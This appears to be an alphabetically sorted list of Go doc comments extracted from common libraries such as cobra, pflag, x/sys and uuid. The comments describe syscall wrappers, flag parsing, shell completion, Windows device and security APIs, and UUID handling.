// Note that on non-Unix systems os.Stdin.Fd() may not be 0.
// Note that sometimes we use a lowercase //sys name and
// Note that sometimes we use a lowercase //sys name and wrap
// Note that the special case of blocking further
// Note that we want to perform flagname completion even if finalCmd.DisableFlagParsing==true
// Note: this strategy for suspending in the middle and
// Note: unix.Accept does not work at this time
// Notice that a call to Execute and ExecuteC will replace a nil context of
// Now wrap the rest
// NsecToTimespec converts a number of nanoseconds into a Timespec.
// NsecToTimeval converts a number of nanoseconds into a Timeval.
// NthPreviousEntry returns the value passed to the nth previous call to Add.
// NullUUID implements the SQL driver.Scanner interface so
// NullUUID represents a UUID that may be null.
// OK
// On a POSIX system the id should be the users UID for the Person
// On some 32-bit systems the range of valid Timespec values are smaller
// OnInitialize sets the passed functions to be run when each command's
// Only addresses of at least 6 bytes are returned.
// Only consider the case where the flag does not contain an =.
// Only consider this flag group at all if all the flags are defined.
// Only create this special command if it is actually being called.
// Only errs if the flag isn't found.
// Only one of ValidArgs and ValidArgsFunction can be used for a command.
// Only one of ValidArgs or ValidArgsFunction can be used for a single command.
// Only remove the fds entry if it exists and this cookie matches
// Only remove the paths entry if it exists and this cookie matches
// OnlyValidArgs returns an error if any args are not in the list of ValidArgs.
// Open a pty and its corresponding tty.
// Open a socket to perform SHA1 hashing.
// Open modes
// OpenBSD system calls.
// OpenByHandleAt wraps the open_by_handle_at system call
// OpenByHandleAt).
// OpenCurrentProcessToken opens an access token associated with current
// OpenDevRegKey method opens a registry key for device-specific configuration information.
// Open_extended
// Open_nocancel
// Otherwise the shell scripts will interpret the other lines as new flags
// OutOrStderr returns output to stderr
// OutOrStdout returns output to stdout.
// Output
// Output from stderr must be ignored by the completion script.
// Output:
// Output: 85cdcad0c06eef66f805ecce353bec9accbeecc5
// Ovadvise
// Owner returns the security descriptor owner and whether it was defaulted.
// PFlagFromGoFlag will return a 
// Package cobra is a commander providing a simple interface to create powerful modern CLI interfaces.
// Package plan9 contains an interface to the low-level operating system
// Package pty provides functions for working with Unix terminals.
// Package unix contains an interface to the low-level operating system
// Package unsafeheader contains header declarations for the Go runtime's
// Package uuid generates and inspects UUIDs.
// Package windows contains an interface to the low-level operating system
// Pad to the same size as ifreq.
// PanicOnError will panic() if an error is found when parsing flags
// Parameter constants for NtCreateNamedPipeFile.
// Parent returns a commands parent command.
// Parse converts the input string (containing TML tags) into a string containing ANSI escape code sequences for output to the terminal.
// Parse decodes s into a UUID or returns an error.  Both the standard UUID
// Parse nwmTriplets to get offsets of returned entries
// Parse parses the command-line flags from os.Args[1:].  Must be called
// Parse takes input from the reader and converts any provided tags to the relevant ANSI escape codes for output to parser's writer.
// Parse the flags early so we can check if required flags are set
// ParseAll parses the command-line flags from os.Args[1:] and called fn for each.
// ParseErrorsWhitelist defines the parsing errors that can be ignored
// ParseErrorsWhitelist is used to configure a whitelist of errors
// ParseFlags parses persistent flag tree and local flags.
// ParseIPv4Mask written in IP form (e.g. 255.255.255.0).
// ParseOrigDstAddr decodes a socket control message containing the original
// ParseSocketControlMessage parses b as an array of socket control
// ParseUnixCredentials decodes a socket control message that contains
// ParseUnixRights decodes a socket control message that contains an
// Parsed reports whether f.Parse has been called.
// Parsed returns true if the command-line flags have been parsed.
// Parser is used to parse a TML string into an output string containing ANSI escape codes
// PathIsWatched checks to see if path is associated with this EventPort.
// Peeks returns the word in 
// Pending wraps port_getn(3c) and returns how many events are pending.
// Per-process epoll implementation.
// PersistentFlags returns the persistent FlagSet specifically set in the current command.
// PersistentPostRun: children of this command will inherit and execute after PostRun.
// PersistentPostRunE: PersistentPostRun but returns an error.
// PersistentPreRun: children of this command will inherit and execute.
// PersistentPreRunE: PersistentPreRun but returns an error.
// Personality
// PktInfo4 encodes Inet4Pktinfo into a socket control message of type IP_PKTINFO.
// PktInfo6 encodes Inet6Pktinfo into a socket control message of type IPV6_PKTINFO.
// Plan 9 Constants
// Plan 9 directory marshalling. See intro(5).
// Plan 9 environment variables.
// Plan 9 system calls.
// Plan 9 system messages. Invented to support
// Pledge implements the pledge syscall.
// PledgeExecpromises implements the pledge syscall.
// PledgePromises implements the pledge syscall.
// Pointer represents a pointer to an arbitrary Windows type.
// Pointer-typed fields may point to one of many different types. It's
// Poll_nocancel
// PortEvent is an abstraction of the port_event C struct.
// Posix_spawn
// Possible which values for Getitimer and Setitimer.
// PostRun: run after the Run command.
// PostRunE: PostRun but returns an error.
// PrctlRetInt performs a prctl operation specified by option and further
// PreRun: children of this command will not inherit.
// PreRunE: PreRun but returns an error.
// Pread_nocancel
// Predefined domain-relative RIDs for local groups.
// Predefined names.
// Predefined resource names and types.
// Predefined types.
// Print each possible completion to stdout for the completion script to consume.
// Print some helpful info to stderr for the user to understand.
// Print warnings if they occurred (e.g. deprecated flag messages).
// PrintDefaults prints to standard error the default values of all defined command-line flags.
// Prints to the completion script debug file (if BASH_COMP_DEBUG_FILE
// Priority class.
// Privilege attributes
// ProcThreadAttributeList is a placeholder type to represent a PROC_THREAD_ATTRIBUTE_LIST.
// ProcThreadAttributeListContainer.List.
// Proc_info
// Process Status API (PSAPI)
// Process creation flags.
// ProcessEntry32 structure defined by the Win32 API
// ProcessInformationClasses for NtQueryInformationProcess and NtSetInformationProcess.
// Profil
// PropChangeParams is a structure corresponding to a DIF_PROPERTYCHANGE install function.
// Pselect6
// Ptrace
// PtraceGetRegSetArm64 fetches the registers used by arm64 binaries.
// PtraceGetRegs386 fetches the registers used by 386 binaries.
// PtraceGetRegsAmd64 fetches the registers used by amd64 binaries.
// PtraceGetRegsArm fetches the registers used by arm binaries.
// PtraceGetRegsArm64 fetches the registers used by arm64 binaries.
// PtraceGetRegsMips fetches the registers used by mips binaries.
// PtraceGetRegsMips64 fetches the registers used by mips64 binaries.
// PtraceGetRegsMips64le fetches the registers used by mips64le binaries.
// PtraceGetRegsMipsle fetches the registers used by mipsle binaries.
// PtraceRegs386 is the registers used by 386 binaries.
// PtraceRegsAmd64 is the registers used by amd64 binaries.
// PtraceRegsArm is the registers used by arm binaries.
// PtraceRegsArm64 is the registers used by arm64 binaries.
// PtraceRegsMips is the registers used by mips binaries.
// PtraceRegsMips64 is the registers used by mips64 binaries.
// PtraceRegsMips64le is the registers used by mips64le binaries.
// PtraceRegsMipsle is the registers used by mipsle binaries.
// PtraceSetRegSetArm64 sets the registers used by arm64 binaries.
// PtraceSetRegs386 sets the registers used by 386 binaries.
// PtraceSetRegsAmd64 sets the registers used by amd64 binaries.
// PtraceSetRegsArm sets the registers used by arm binaries.
// PtraceSetRegsArm64 sets the registers used by arm64 binaries.
// PtraceSetRegsMips sets the registers used by mips binaries.
// PtraceSetRegsMips64 sets the registers used by mips64 binaries.
// PtraceSetRegsMips64le sets the registers used by mips64le binaries.
// PtraceSetRegsMipsle sets the registers used by mipsle binaries.
// Putpmsg
// Putting a terminal into raw mode is the most common requirement:
// Pwrite_nocancel
// Qid.Type bits
// Quotactl
// REG_NOTIFY_CHANGE_NAME notifies the caller if a subkey is added or deleted.
// REG_NOTIFY_CHANGE_SECURITY notifies the caller of changes to the security descriptor of the key.
// REG_NOTIFY_THREAD_AGNOSTIC indicates that the lifetime of the registration must not be tied to the lifetime of the thread issuing the RegNotifyChangeKeyValue call. Note: This flag value is only supported in Windows 8 and later.
// RMControl returns the security descriptor resource manager control bits.
// RangeArgs returns an error if the number of args is not within the expected range.
// RawSyscallNoError may be used instead of RawSyscall for syscalls that don't
// Read into buffer of that size.
// Read one raw CAN frame
// ReadDirent reads directory entries from fd and writes them into buf.
// ReadLine returns a line of input from the terminal.
// ReadPassword reads a line of input from a terminal without local echo.  This
// Read_nocancel
// Readahead
// Readlink returns the destination of the named symbolic link.
// Readv
// Readv_nocancel
// Reboot
// Recommended syntax is as follow:
// Recursively find matching persistent flag.
// Recvfrom
// Recvfrom_nocancel
// Recvmsg not implemented on AIX
// Recvmsg_nocancel
// RegNotifyChangeKeyValue notifyFilter flags.
// Register mapping in m and return it.
// RegisterFlagCompletionFunc should be called to register a function to provide completion for a flag.
// Release unloads DLL d from memory.
// Remainder.
// RemapFilePages
// Remember the default value as a string
// RemoteIovec is Iovec with the pointer replaced with an integer.
// Remove all activeHelp entries in this case
// Remove any description that may be included following a tab character.
// Remove any description that may be included in ValidArgs.
// Remove the uncompleted flag or else there could be an error created
// RemoveCommand removes one or more commands from a parent command.
// RemoveDeviceParams is a structure corresponding to a DIF_REMOVE install function.
// Removexattr
// Replace will fully overwrite any data currently in the flag value list.
// Requires kernel >= 5.12.
// Reset all attributes
// Reset everything to do noun completion.
// ResetFlags deletes all flags from command.
// RestartSyscall
// Restore LE stack.
// Restore restores the terminal connected to the given file descriptor to a
// Retrieve ctx by calling cmd.Context() inside your 
// Retrieve the size of the shared memory to enable slice creation
// Return value of SleepEx and other APC functions
// Return values for GetDriveType.
// Returns a string listing the different directive enabled in the specified parameter
// Returns the address of errno in R3.
// Returns the string format of the constraints
// Rewrite leading NUL as @ for textual display.
// Rfork flags
// Root can execute any file that anybody can execute.
// Root can read and write any file.
// Root finds root command.
// Root help command.
// Round the length of a raw sockaddr up to align it properly.
// RtSigaction
// RtSigpending
// RtSigprocmask
// RtSigqueueinfo
// RtSigreturn
// RtSigsuspend
// RtSigtimedwait
// Run: Typically the actual work function. Most commands will only implement this.
// RunE: Run but returns an error.
// Runnable determines if the command is itself runnable.
// SACL returns the security descriptor SACL and whether it was defaulted. The sacl return value may be nil
// SO_PASSCRED option must be enabled on the socket.
// SPARC includes this in /usr/include/sparc64-linux-gnu/bits/socket.h
// SPDIT flags to distinguish between class drivers and
// SPDRP specifies device registry property codes
// SS_
// SUOI flags control SetupUninstallOEMInf
// SYS_NOSYS = 0
// SYS_NOSYS = 8
// Sanity check group count.  Max is 1<<16 on Linux.
// Sanity check group count. Max is 16 on BSD.
// Sanity check group count. Max is 1<<16 on Linux.
// Sbrk
// Scan implements sql.Scanner so UUIDs can be read from databases transparently.
// Scan implements the SQL driver.Scanner interface.
// SchedGetPriorityMax
// SchedGetPriorityMin
// SchedGetaffinity gets the CPU affinity mask of the thread specified by pid.
// SchedGetparam
// SchedGetscheduler
// SchedRrGetInterval
// SchedSetaffinity sets the CPU affinity mask of the thread specified by pid.
// SchedSetparam
// SchedYield
// Scope is the publication scopes when binding service/service range.
// Searchfs
// Security
// SecurityDescriptorFromString converts an SDDL string describing a security descriptor into a
// See ../runtime/sys_linux_386.s for the reason why we always use int 0x80
// See https://github.com/spf13/cobra/issues/1002
// See https://msdn.microsoft.com/en-us/library/windows/desktop/aa379649(v=vs.85).aspx
// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms684179(v=vs.85).aspx
// See https://www.freebsd.org/doc/en_US.ISO8859-1/books/porters-handbook/versions.html.
// See man cap_rights_get(3) and rights(4).
// See man cap_rights_init(3) and rights(4).
// See man cap_rights_limit(2) and rights(4).
// See mksyscall.pl.
// See the License for the specific language governing permissions and
// See the full documentation at:
// See version list in https://github.com/DragonFlyBSD/DragonFlyBSD/blob/master/sys/sys/param.h
// See: https://msdn.microsoft.com/en-us/library/ff919712%28VS.85%29.aspx
// Segments returns the numeric segments of the version as a slice of ints.
// Segments64 returns the numeric segments of the version as a slice of int64s.
// Select
// Select_nocancel
// SelectedDevice method retrieves the selected device information element in a device information set.
// SelectedDriver method retrieves the selected driver for a device information set or a particular device information element.
// Sem_close
// Sem_destroy
// Sem_getvalue
// Sem_init
// Sem_open
// Sem_post
// Sem_trywait
// Sem_unlink
// Sem_wait
// Sem_wait_nocancel
// Semctl
// Semget
// Semop
// Semsys
// Semtimedop
// SemverRegexpRaw requires a separator between version and prerelease
// SendmsgN not implemented on AIX
// Sendmsg_nocancel
// Sendto
// Sendto_nocancel
// Server 2008: The LOAD_LIBRARY_SEARCH_
// Server example:
// Services.
// Set adds cpu to the set s.
// Set adds fd to the set fds.
// Set implements pflag.Value.Set.
// Set sets the value of the named command-line flag.
// Set sets the value of the named flag.
// Set stdin in raw mode.
// Set the seek offset of the input fd to record
// Set this to true to enable it.
// SetAnnotation allows one to set arbitrary annotations on a flag in the FlagSet.
// SetBracketedPasteMode requests that the terminal bracket paste operations
// SetClassInstallParams method sets or clears class install parameters for a device information set or a particular device information element.
// SetClockSequence sets the clock sequence to the lower 14 bits of seq.  Setting to
// SetClockSequence then it will be set automatically.  If GetTime fails to
// SetContext sets context for the command. It is set to context.Background by default and will be overwritten by
// SetControl sets the security descriptor control bits.
// SetDACL sets the absolute security descriptor DACL.
// SetDeviceInstallParams member sets device installation parameters for a device information set or a particular device information element.
// SetDeviceRegistryProperty function sets a Plug and Play device property for a device.
// SetDeviceRegistryPropertyString method sets a Plug and Play device property string for a device.
// SetErr sets the destination for error messages.
// SetFlagErrorFunc sets a function to generate an error when flag parsing
// SetGlobalNormalizationFunc sets a normalization function to all flag sets and also to child commands.
// SetGroup sets the absolute security descriptor owner.
// SetHelpCommand sets help command.
// SetHelpFunc sets help function. Can be defined by Application.
// SetHelpTemplate sets help template to be used. Application can use it to set custom template.
// SetIn sets the source for input data
// SetInet4Addr sets a C in_addr/Go []byte (4-byte IPv4 address) value in an
// SetInterspersed sets whether to support interspersed option/non-option arguments.
// SetMempolicy
// SetNodeID sets the Node ID to be used for Version 1 UUIDs.  The first 6 bytes
// SetNodeID.
// SetNodeInterface selects the hardware address to be used for Version 1 UUIDs.
// SetNormalizeFunc allows you to add a function which can translate flag names.
// SetOut sets the destination for usage messages.
// SetOutput sets the destination for usage and error messages.
// SetOwner sets the absolute security descriptor owner.
// SetPrompt sets the prompt to be used when reading subsequent lines.
// SetRMControl sets the security descriptor resource manager control bits.
// SetRobustList
// SetSACL sets the absolute security descriptor SACL.
// SetSelectedDevice method sets a device information element as the selected member of a device information set. This function is typically used by an installation wizard.
// SetThreadArea
// SetTidAddress
// SetUint16 sets a C short/Go uint16 value as the Ifreq's union data.
// SetUint32 sets a C int/Go uint32 value as the Ifreq's union data.
// SetUsageFunc sets usage function. Usage can be defined by application.
// SetUsageTemplate sets usage template. Can be defined by Application.
// SetVersionTemplate sets version template to be used. Application can use it to set custom template.
// Setattrlist
// Setaudit
// Setaudit_addr
// Setauid
// SetfsgidRetGid sets fsgid for current thread and returns previous fsgid set.
// SetfsuidRetUid sets fsuid for current thread and returns previous fsuid set.
// Setitimer
// Setitimer wraps setitimer(2) to arm or disarm the timer specified by which.
// Setitimer.
// Setlcid
// Setrlimit prefers the prlimit64 system call. See issue 38604.
// Setsgroups
// Setsid_with_pid
// Setsize resizes t to s.
// SetsockoptSockFprog attaches a classic BPF or an extended BPF program to a
// Settid
// Setting things back to normal
// Setup annotations for go completions for registered flags
// SetupDiClassGuidsFromNameEx function retrieves the GUIDs associated with the specified class name. This resulting list contains the classes currently installed on a local or remote computer.
// SetupDiClassNameFromGuidEx function retrieves the class name associated with a class GUID. The class can be installed on a local or remote computer.
// SetupDiCreateDeviceInfo function creates a new device information element and adds it as a new member to the specified device information set.
// SetupDiCreateDeviceInfoListEx function creates an empty device information set on a remote or a local computer and optionally associates the set with a device setup class.
// SetupDiDestroyDeviceInfoList function deletes a device information set and frees all associated memory.
// SetupDiEnumDeviceInfo function returns a DevInfoData structure that specifies a device information element in a device information set.
// SetupDiEnumDriverInfo function enumerates the members of a driver list.
// SetupDiGetClassDevsEx function returns a handle to a device information set that contains requested device information elements for a local or a remote computer.
// SetupDiGetClassInstallParams function retrieves class installation parameters for a device information set or a particular device information element.
// SetupDiGetDeviceInstallParams function retrieves device installation parameters for a device information set or a particular device information element.
// SetupDiGetDeviceInstanceId function retrieves the instance ID of the device.
// SetupDiGetDeviceProperty function retrieves a specified device instance property.
// SetupDiGetDeviceRegistryProperty function retrieves a specified Plug and Play device property.
// SetupDiGetDeviceRegistryProperty)
// SetupDiGetDriverInfoDetail function retrieves driver information detail for a device information set or a particular device information element in the device information set.
// SetupDiGetSelectedDevice function retrieves the selected device information element in a device information set.
// SetupDiGetSelectedDriver function retrieves the selected driver for a device information set or a particular device information element.
// SetupDiOpenDevRegKey function opens a registry key for device-specific configuration information.
// SetupDiSetClassInstallParams function sets or clears class install parameters for a device information set or a particular device information element.
// SetupDiSetDeviceRegistryProperty function sets a Plug and Play device property for a device.
// SetupDiSetSelectedDevice function sets a device information element as the selected member of a device information set. This function is typically used by an installation wizard.
// SetupUninstallOEMInf uninstalls the specified driver.
// Setwgroups
// Setxattr
// Shared_region_check_np
// Shared_region_map_np
// ShellCompDirective is a bit map representing the different behaviors the shell
// ShellCompDirectiveDefault indicates to let the shell perform its default
// ShellCompDirectiveError indicates an error occurred and completions should be ignored.
// ShellCompDirectiveFilterDirs indicates that only directory names should
// ShellCompDirectiveFilterFileExt indicates that the provided completions
// ShellCompDirectiveFilterFileExt.
// ShellCompDirectiveNoFileComp indicates that the shell should not provide
// ShellCompDirectiveNoSpace indicates that the shell should not add a space
// ShellCompNoDescRequestCmd is the name of the hidden command that is used to request
// ShellCompRequestCmd is the name of the hidden command that is used to request
// Shm_open
// Shm_unlink
// Shmat
// Shmctl
// Shmdt
// Shmget
// Shmsys
// Short is the short description shown in the 'help' output.
// Should be set to TIPC_CLUSTER_SCOPE or TIPC_NODE_SCOPE.
// ShowWindow constants
// Sigaction
// Sigaltstack
// Signal table
// SignalName returns the signal name for signal number s.
// Signals
// Sigpending
// Sigprocmask
// Sigreturn
// Sigsuspend
// Sigsuspend_nocancel
// SilenceErrors is an option to quiet errors down stream.
// SilenceUsage is an option to silence usage when an error occurs.
// Simulate Getdirentries using fdopendir/readdir_r/closedir.
// Since Linux 2.6.7 and further zero value is the first available channel.
// Single-word zero for use when we need a valid pointer to 0 bytes.
// Slice is the runtime representation of a slice.
// Slice memory layout
// Slice returns a byte slice that aliases the data in the NTString.
// Slice returns a uint16 slice that aliases the data in the NTUnicodeString.
// SliceValue is a secondary interface to all flags which hold a list
// Sockaddr represents a socket address.
// SockaddrALG enables userspace access to the Linux kernel's cryptography
// SockaddrALG implements the Sockaddr interface for AF_ALG type sockets.
// SockaddrCAN implements the Sockaddr interface for AF_CAN type sockets.
// SockaddrCANJ1939 implements the Sockaddr interface for AF_CAN using J1939
// SockaddrCtl implements the Sockaddr interface for AF_SYSTEM type sockets.
// SockaddrDatalink implements the Sockaddr interface for AF_LINK type sockets.
// SockaddrHCI implements the Sockaddr interface for AF_BLUETOOTH type sockets
// SockaddrIUCV implements the Sockaddr interface for AF_IUCV sockets.
// SockaddrInet4 implements the Sockaddr interface for AF_INET type sockets.
// SockaddrInet6 implements the Sockaddr interface for AF_INET6 type sockets.
// SockaddrL2 implements the Sockaddr interface for AF_BLUETOOTH type sockets
// SockaddrL2TPIP implements the Sockaddr interface for IPPROTO_L2TP/AF_INET sockets.
// SockaddrL2TPIP6 implements the Sockaddr interface for IPPROTO_L2TP/AF_INET6 sockets.
// SockaddrLinklayer implements the Sockaddr interface for AF_PACKET type sockets.
// SockaddrNetlink implements the Sockaddr interface for AF_NETLINK type sockets.
// SockaddrRFCOMM implements the Sockaddr interface for AF_BLUETOOTH type sockets
// SockaddrTIPC implements the Sockaddr interface for AF_TIPC type sockets.
// SockaddrTIPC. It is only implemented by 
// SockaddrUnix implements the Sockaddr interface for AF_UNIX type sockets.
// SockaddrVM implements the Sockaddr interface for AF_VSOCK type sockets.
// SockaddrVM provides access to Darwin VM sockets: a mechanism that enables
// SockaddrVM provides access to Linux VM sockets: a mechanism that enables
// Socket control messages
// Socket related.
// SocketControlMessage represents a socket control message.
// Socketoption Level
// Socketpair
// Solaris allow up to 1024 (NGROUPS_MAX).
// Solaris doesn't have an futimes function because it allows NULL to be
// Solaris system calls.
// Some external packages rely on SYS___SYSCTL being defined to implement their
// Some terminals (e.g. xterm) will truncate lines that were
// Some versions of AIX have a bug in getsockname (see IV78655).
// Sorts commands by their names.
// Spare
// Split name into components.
// Splits the string 
// Sstk
// Stack_snapshot
// Start the command with a pty.
// StartedByExplorer returns true if the program was invoked by the user
// StartedByExplorer returns true if the program was invoked by the user double-clicking
// Starts the process in a new session and sets the controlling terminal.
// Stat64_extended
// Stat_extended
// State contains the state of a terminal.
// Stats from nwmConnEntry are specific to that connection.
// Stats from nwmTCPStatsEntry are global (to the interface
// Storing normal writers
// String implements pflag.Value.String.
// String is the runtime representation of a string.
// String returns the full version string included pre-release
// StringToSid converts a string-format security identifier
// StringToUTF16 is deprecated. Use UTF16FromString instead.
// StringToUTF16Ptr is deprecated. Use UTF16PtrFromString instead.
// Strioctl Helpers
// SubAuthority returns the sub-authority of the SID as specified by
// SubAuthorityCount returns the number of sub-authorities in the SID.
// Such logs are only printed when the user has set the environment
// Such strings will be processed by the completion script and will be shown as ActiveHelp
// SuggestFor is an array of command names for which this command will be suggested -
// SuggestionsFor provides suggestions for the typedName.
// SuggestionsMinimumDistance defines minimum levenshtein distance to display suggestions.
// Swapoff
// Swapon
// Switch back to Go stack.
// Switch to saved LE stack.
// SyscallNoError may be used instead of Syscall for syscalls that don't fail.
// Sysfs
// System call support for 386 BSD
// System call support for AMD64 BSD
// System call support for ARM BSD
// System call support for ARM64 BSD
// System call support for plan9 on arm
// System calls for linux/riscv64.
// System determines whether the DLL must be loaded from the
// System specify target computer to search for.
// System specify target computer to search.
// SystemInformationClasses for NtQuerySystemInformation and NtSetSystemInformation
// SysvShmAttach attaches the Sysv shared memory segment associated with the
// SysvShmCtl performs control operations on the shared memory segment
// SysvShmDetach unmaps the shared memory slice returned from SysvShmAttach.
// SysvShmGet returns the Sysv shared memory identifier associated with key.
// THIS FILE IS GENERATED BY THE COMMAND AT THE TOP
// TIPCAddr is implemented by types that can be used as an address for
// TODO
// TODO(aram): remove hack after I fix _nsec in the pc64 kernel.
// TODO(brainman): fix all needed for net
// TODO(brainman): fix all needed for os
// TODO(mattn): SockaddrGen is union of sockaddr/sockaddr_in/sockaddr_in6_old.
// TODO(mdlayher): export as IfreqData
// TODO(mdlayher): export if and when IfreqData is exported.
// TODO(mundaym): z/OS doesn't have wait4. I don't think getrusage does what we want.
// TODO(neeilan) : Remove this 0 ( added to get sys/unix compiling on z/OS )
// TODO(neeilan): Implement use of first param (fd)
// TODO(neeilan): Pad is because the Linux kernel expects a 96-bit struct. We never pass this to the kernel
// TODO(neeilan): Remove 0 arg added to get this compiling on z/OS
// TODO(neeilan): Remove 0 in call
// TODO(neeilan): We can eliminate these epToPoll / pToEpoll calls by using identical mask values for POLL/EPOLL
// TODO(rsc): Can we use a single global basep for all calls
// TODO: auto-generate.
// TODO: convert to unsafe.Slice once we can assume Go 1.17
// TODO: some existing code incorrectly uses ioctl when it should use ioctlPtr.
// TODO: wrap
// TOKEN_QUERY token.
// Terminal contains the state for running a VT100 terminal that is capable of
// The 
// The 0x80 bit is whether there was a core dump.
// The EOF case when the line is empty is handled in
// The Linger struct is wrong but we only noticed after Go 1.
// The Linux kernel faccessat system call does not take any flags.
// The Microsoft documentation for this struct
// The RxID and TxID fields are used for transport protocol addressing in
// The SockaddrCAN struct must be bound to the socket file descriptor
// The actual call may return less than the original reported required
// The annotation requests simple file completion.  There is no reason to do
// The argument is expected to be a function with with one uintptr-sized result. The function must not have arguments with size larger than the size of uintptr.
// The argument p point64s to a map[string]int64 variable in which to store the value of the flag.
// The argument p point64s to a map[string]int64 variable in which to store the values of the multiple flags.
// The argument p points to a []bool variable in which to store the value of the flag.
// The argument p points to a []float32 variable in which to store the value of the flag.
// The argument p points to a []float64 variable in which to store the value of the flag.
// The argument p points to a []int variable in which to store the value of the flag.
// The argument p points to a []int32 variable in which to store the value of the flag.
// The argument p points to a []int64 variable in which to store the value of the flag.
// The argument p points to a []net.IP variable in which to store the value of the flag.
// The argument p points to a []string variable in which to store the value of the flag.
// The argument p points to a []string variable in which to store the values of the multiple flags.
// The argument p points to a []time.Duration variable in which to store the value of the flag.
// The argument p points to a []uint variable in which to store the value of the flag.
// The argument p points to a bool variable in which to store the value of the flag.
// The argument p points to a duration[] variable in which to store the value of the flag.
// The argument p points to a float32 variable in which to store the value of the flag.
// The argument p points to a float32[] variable in which to store the value of the flag.
// The argument p points to a float64 variable in which to store the value of the flag.
// The argument p points to a float64[] variable in which to store the value of the flag.
// The argument p points to a int32[] variable in which to store the value of the flag.
// The argument p points to a int64[] variable in which to store the value of the flag.
// The argument p points to a int[] variable in which to store the value of the flag.
// The argument p points to a map[string]int variable in which to store the value of the flag.
// The argument p points to a map[string]int variable in which to store the values of the multiple flags.
// The argument p points to a map[string]string variable in which to store the value of the flag.
// The argument p points to a map[string]string variable in which to store the values of the multiple flags.
// The argument p points to a string variable in which to store the value of the flag.
// The argument p points to a time.Duration variable in which to store the value of the flag.
// The argument p points to a uint  variable in which to store the value of the flag.
// The argument p points to a uint variable in which to store the value of the flag.
// The argument p points to a uint32  variable in which to store the value of the flag.
// The argument p points to a uint32 variable in which to store the value of the flag.
// The argument p points to a uint64 variable in which to store the value of the flag.
// The argument p points to a uint8 variable in which to store the value of the flag.
// The argument p points to a uint[] variable in which to store the value of the flag.
// The argument p points to an []byte variable in which to store the value of the flag.
// The argument p points to an int variable in which to store the value of the flag.
// The argument p points to an int16 variable in which to store the value of the flag.
// The argument p points to an int32 variable in which to store the value of the flag.
// The argument p points to an int64 variable in which to store the value of the flag.
// The argument p points to an int8 variable in which to store the value of the flag.
// The argument p points to an net.IP variable in which to store the value of the flag.
// The argument p points to an net.IPMask variable in which to store the value of the flag.
// The argument p points to an net.IPNet variable in which to store the value of the flag.
// The arguments for fn are flag and value. Must be called after all flags are
// The arguments to the underlying system call (SYS_SOCKETCALL) are the
// The array parameter should be the array that will contain the completions.
// The bash completion script will call the bash function f for the flag.
// The below values should not be changed: programs will be using them explicitly
// The capability rights on fd can never be increased by CapRightsLimit.
// The clock sequence is only well defined for version 1 and 2 UUIDs.
// The code generator produces -0x1 for (
// The compiled regular expression used to test the validity of a version.
// The completion script expects :<directive>
// The counter will let us know where we should start up again.
// The directive integer must be that last character following a single colon (:).
// The field is a function (not a method) that may be changed to point to
// The following errors do not correspond to any
// The following flag can be used to install a device disabled
// The freebsd12 syscall needs a 64-bit base. On 32-bit machines
// The full SocketCAN documentation can be found in the linux kernel
// The function doesn't even check the validity of the
// The function is a variable that may be changed to point to a custom function.
// The generated scripts require PowerShell v5.0
// The glibc faccessat implements the flags itself
// The help should be sent to stdout
// The information below is extracted and adapted from <sys/stat.h> macros.
// The information below is extracted and adapted from bits/sysmacros.h in the
// The information below is extracted and adapted from sys/types.h:
// The initial socket setup process is as follows:
// The key of this map is a pointer to the corresponding 
// The memory layout of IfreqData (type-safe) and ifreq (not type-safe) are
// The old syscall entries are smaller than the new. Use 1/4 of the original
// The parameters for the OS X implementation vary slightly compared to the
// The pledge syscall does not accept execpromises on OpenBSD releases
// The primary use of this package is inside other packages that provide a more
// The ptrace syscall differs from glibc's ptrace.
// The raw regular expression string used for testing the validity
// The req value is expected to be TCGETS
// The req value will usually be TCSETA or TIOCSETA.
// The return value can be passed to Syscall to run the procedure.
// The return value is the address of a []bool variable that stores the value of the flag.
// The return value is the address of a []float32 variable that stores the value of the flag.
// The return value is the address of a []float64 variable that stores the value of the flag.
// The return value is the address of a []int variable that stores the value of the flag.
// The return value is the address of a []int32 variable that stores the value of the flag.
// The return value is the address of a []int64 variable that stores the value of the flag.
// The return value is the address of a []net.IP variable that stores the value of that flag.
// The return value is the address of a []net.IP variable that stores the value of the flag.
// The return value is the address of a []string variable that stores the value of the flag.
// The return value is the address of a []time.Duration variable that stores the value of the flag.
// The return value is the address of a []uint variable that stores the value of the flag.
// The return value is the address of a bool variable that stores the value of the flag.
// The return value is the address of a float32 variable that stores the value of the flag.
// The return value is the address of a float64 variable that stores the value of the flag.
// The return value is the address of a map[string]int variable that stores the value of the flag.
// The return value is the address of a map[string]int64 variable that stores the value of the flag.
// The return value is the address of a map[string]string variable that stores the value of the flag.
// The return value is the address of a string variable that stores the value of the flag.
// The return value is the address of a time.Duration variable that stores the value of the flag.
// The return value is the address of a uint  variable that stores the value of the flag.
// The return value is the address of a uint32  variable that stores the value of the flag.
// The return value is the address of a uint64 variable that stores the value of the flag.
// The return value is the address of a uint8 variable that stores the value of the flag.
// The return value is the address of an []byte variable that stores the value of the flag.
// The return value is the address of an int variable that stores the value of the flag.
// The return value is the address of an int16 variable that stores the value of the flag.
// The return value is the address of an int32 variable that stores the value of the flag.
// The return value is the address of an int64 variable that stores the value of the flag.
// The return value is the address of an int8 variable that stores the value of the flag.
// The return value is the address of an net.IP variable that stores the value of the flag.
// The return value is the address of an net.IPMask variable that stores the value of the flag.
// The return value is the address of an net.IPNet variable that stores the value of the flag.
// The return value will be ErrHelp if -help was set but not defined.
// The returned error is always nil.
// The runtime may know about them.
// The security identifier (SID) structure is a variable-length
// The slice returned does not include the 
// The strength of the UUIDs is based on the strength of the crypto/rand
// The sync_file_range and arm_sync_file_range syscalls differ only in the
// The sync_file_range and sync_file_range2 syscalls differ only in the
// The third argument to ioctl is often a pointer but sometimes an integer.
// The tricky situation is if the event has fired in the kernel but
// The user cookie presents an interesting challenge from a memory management perspective.
// The user should not have a cyclic dependency on commands.
// The uuid package does not use global static storage for the clock sequence or
// The value for a flag
// The value of each argument will not try to be separated by comma
// The value of each argument will not try to be separated by comma. Use a StringSlice for that.
// There are two paths by which we can discover that it is no longer in use:
// There is no alignment on AIX.
// Therefore to avoid false positives we clear errno before calling it.
// These calls return err == nil to indicate success
// These commands are KEYCTL_DESCRIBE and KEYCTL_GET_SECURITY.
// These dimensions don't include any scrollback buffer height.
// These values should cover the same set of registry properties
// This allows the standard completion logic to behave appropriately for flag groups
// This also makes the list of suggested flags shorter as we avoid all the = forms.
// This attempts to replicate the behaviour documented for cfmakeraw in
// This changes the execpromises and leaves the promises untouched.
// This changes the promises and leaves the execpromises untouched.
// This constant mirrors the 
